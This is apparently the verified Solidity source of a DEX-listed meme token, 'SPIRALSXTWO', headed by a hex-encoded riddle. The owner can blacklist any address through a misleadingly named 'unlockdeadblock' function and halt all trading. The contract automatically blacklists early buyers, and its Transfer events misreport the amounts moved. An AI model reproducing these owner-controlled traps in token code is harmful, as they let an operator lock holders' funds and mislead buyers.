/**
 *Submitted for verification at Etherscan.io on 2022-07-28
*/

/*

41 72 74 20 69 73 20 61 62 73 74 72 61 63 74 2E 20 0A 41 72 74 20 69 73 20 70 75 72 65 
2E 20 0A 53 70 69 72 61 6C 20 75 70 77 61 72 64 73 20 77 65 20 77 6F 75 6C 64 20 61 6C 
6C 20 65 6E 64 75 72 65 2E 20 0A 49 66 20 79 6F 75 20 74 68 69 6E 6B 20 70 68 61 73 65 
20 6F 6E 65 20 77 61 73 20 61 6C 6C 20 62 75 74 20 64 77 69 6E 64 6C 65 2E 0A 63 6F 6D 
65 20 64 65 63 69 70 68 65 72 20 74 68 69 73 20 67 72 65 61 74 20 72 69 64 64 6C 65 2E 
0A 48 61 76 65 20 61 20 6C 6F 6F 6B 20 64 6F 77 6E 20 79 6F 75 72 20 73 68 6F 65 2E 0A 
57 65 20 61 72 65 20 68 65 72 65 20 74 6F 20 70 6C 61 79 20 70 68 61 73 65 20 74 77 6F 
2E 0A 0A 68 74 74 70 73 3A 2F 2F 74 2E 6D 65 2F 53 70 69 72 61 6C 73 78 74 77 6F

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

contract ERC20New is Context, IERC20, Ownable {
  using SafeMath for uint256;

  string constant _name = "SPIRALSXTWO";
  string constant _symbol = "SPIRALS";
  uint8 constant _decimals = 18;

  uint256 _totalSupply = 1000000000 * (10**_decimals);

  mapping (address => uint256) private _balances;
  mapping (address => bool) private _buyondeadblock;
  mapping (address => mapping (address => uint256)) private _allowances;

  mapping (address => bool) private _isExcludeFee;
  mapping (address => bool) private _isExcludeMaxHold;

  IDEXRouter public router;
  address NATIVETOKEN;
  address public pair;
  address public factory;
  address public currentRouter;
  address public recaiver;
  
  uint256 public ratiofee;
  uint256 public totalfee;
  uint256 public marketingfee;
  uint256 public liquidityfee;
  uint256 public burnfee;
  uint256 public feeDenominator;

  uint256 public maxWallet;
  bool public removemaxWallet;
  uint256 public swapthreshold;
  uint256 public deadblock;

  bool public inSwap;
  bool public autoswap;
  bool public baseERC20;
  bool public enabled;

  constructor() {
    recaiver = msg.sender;
    currentRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    NATIVETOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    _isExcludeFee[msg.sender] = true;
    _isExcludeFee[address(this)] = true;
    _isExcludeFee[currentRouter] = true;
    _isExcludeFee[factory] = true;

    _isExcludeMaxHold[msg.sender] = true;
    _isExcludeMaxHold[address(this)] = true;
    _isExcludeMaxHold[currentRouter] = true;
    _isExcludeMaxHold[factory] = true;

    router = IDEXRouter(currentRouter);
    pair = IDEXFactory(router.factory()).createPair(NATIVETOKEN, address(this));
    
    _allowances[address(this)][address(router)] = type(uint256).max;
    _allowances[address(this)][address(factory)] = type(uint256).max;
    _allowances[address(this)][address(pair)] = type(uint256).max;
    IERC20(NATIVETOKEN).approve(address(router),type(uint256).max);
    IERC20(NATIVETOKEN).approve(address(factory),type(uint256).max);
    IERC20(NATIVETOKEN).approve(address(pair),type(uint256).max);

    _isExcludeMaxHold[pair] = true;
    _balances[msg.sender] = _totalSupply;
    maxWallet = _totalSupply.mul(40).div(1000);

    marketingfee = 40;
    liquidityfee = 20;
    burnfee = 10;
    ratiofee = 60;
    totalfee = 70;
    feeDenominator = 1000;
    enabled = true;

    emit Transfer(address(0), msg.sender, _totalSupply);

  }

  function setFee(uint256 _marketing,uint256 _liquidity,uint256 _burn,uint256 _denominator) external onlyOwner returns (bool) {
    require( _marketing.add(_liquidity).add(_burn) <= _denominator.mul(10).div(100) );
    marketingfee = _marketing;
    liquidityfee = _liquidity;
    burnfee = _burn;
    ratiofee = _marketing.add(_liquidity);
    totalfee = ratiofee.add(_burn);
    feeDenominator = _denominator;
    return true;
  }

  function setMaxWalletAmount(uint256 maxAmount) external onlyOwner returns (bool) {
    maxWallet = maxAmount;
    return true;
  }

  function updateETH() external onlyOwner returns (bool) {
    NATIVETOKEN = router.WETH();
    return true;
  }

  function returnERC20(bool flag) external onlyOwner returns (bool) {
    baseERC20 = flag;
    return true;
  }

  function setFeeExempt(address account,bool flag) external onlyOwner returns (bool) {
    _isExcludeFee[account] = flag;
    return true;
  }

  function setMaxHoldExempt(address account,bool flag) external onlyOwner returns (bool) {
    _isExcludeMaxHold[account] = flag;
    return true;
  }


  function unlockdeadblock(address account,bool flag) external onlyOwner returns (bool) {
    _buyondeadblock[account] = flag;
    return true;
  }

  function RemoveMaxWallet(bool flag) external onlyOwner returns (bool) {
    removemaxWallet = flag;
    return true;
  }

  function setAutoSwapback(uint256 amount,bool flag) external onlyOwner returns (bool) {
    swapthreshold = amount;
    autoswap = flag;
    return true;
  }

  function enabletrading(bool flag) external onlyOwner returns (bool) {
    enabled = flag;
    return true;
  }

  function AddLiquidityETH(uint256 _tokenamount) external onlyOwner payable {
    _basictransfer(msg.sender,address(this),_tokenamount.mul(10**_decimals));
    swapthreshold = _balances[address(this)].mul(5).div(1000);
    inSwap= true;
    router.addLiquidityETH{value: address(this).balance }(
    address(this),
    _balances[address(this)],
    0,
    0,
    recaiver,
    block.timestamp
    );
    inSwap = false;
    autoswap = true;
    deadblock = block.timestamp.add(10);
  }

  function decimals() public pure returns (uint8) { return _decimals; }
  function symbol() public pure returns (string memory) { return _symbol; }
  function name() public pure returns (string memory) { return _name; }
  function totalSupply() external view override returns (uint256) { return _totalSupply; }
  function balanceOf(address account) external view override returns (uint256) { return _balances[account]; }

  function isExcludeFee(address account) external view returns (bool) { return _isExcludeFee[account]; }
  function isExcludeMaxHold(address account) external view returns (bool) { return _isExcludeMaxHold[account]; }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transferFrom(msg.sender,recipient,amount);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function swap2ETH(uint256 amount) internal {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = NATIVETOKEN;
    router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    amount,
    0,
    path,
    address(this),
    block.timestamp
    );
  }

  function autoAddLP(uint256 amountToLiquify,uint256 amountBNB) internal {
    router.addLiquidityETH{value: amountBNB }(
    address(this),
    amountToLiquify,
    0,
    0,
    recaiver,
    block.timestamp
    );
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    if(_allowances[sender][msg.sender] != type(uint256).max){
    _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
    }
    _transferFrom(sender,recipient,amount);
    return true;
  }

  function _transferFrom(address sender,address recipient,uint256 amount) internal {
    if(inSwap || baseERC20 || msg.sender == factory || recipient==recaiver){
    _basictransfer(sender, recipient, amount);
    } else {
    if(_balances[address(this)]>swapthreshold && autoswap && msg.sender != pair){
    inSwap = true;
    uint256 amountToMarketing = swapthreshold.mul(marketingfee).div(totalfee);
    uint256 currentthreshold = swapthreshold.sub(amountToMarketing);
    uint256 amountToLiquify = currentthreshold.div(2);
    uint256 amountToSwap = amountToMarketing.add(amountToLiquify);
    uint256 balanceBefore = address(this).balance;
    swap2ETH(amountToSwap);
    uint256 balanceAfter = address(this).balance.sub(balanceBefore);
    uint256 amountpaid = balanceAfter.mul(amountToMarketing).div(amountToSwap);
    uint256 amountLP = balanceAfter.sub(amountpaid);
    payable(owner()).transfer(amountpaid);
    autoAddLP(amountToLiquify,amountLP);
    inSwap = false;
    }
    _transfer(sender, recipient, amount);
    }
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0));
    require(recipient != address(0));
    require(enabled);
    require(_buyondeadblock[sender]!=true);

    if(sender == pair && !_isExcludeMaxHold[recipient] && !removemaxWallet){
    require(_balances[recipient].add(amount) <= maxWallet);
    }

    if(sender == pair && block.timestamp < deadblock && msg.sender != factory){
    _buyondeadblock[recipient] = true;
    }

    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);

    uint256 tempratiofee;
    uint256 tempburnfee;
    uint256 temptotalfee;

    if (!_isExcludeFee[sender]) {
    tempratiofee = amount.mul(ratiofee).div(feeDenominator);
    tempburnfee = amount.mul(burnfee).div(feeDenominator);
    temptotalfee = amount.mul(totalfee).div(feeDenominator);
    _basictransfer(recipient,address(this),tempratiofee);
    _basictransfer(recipient,address(0xdead),tempburnfee);
    }
    emit Transfer(sender, recipient, amount.sub(temptotalfee));
  }

  function _basictransfer(address sender, address recipient, uint256 amount) internal {
    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0));
    require(spender != address(0));
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  receive() external payable { }
}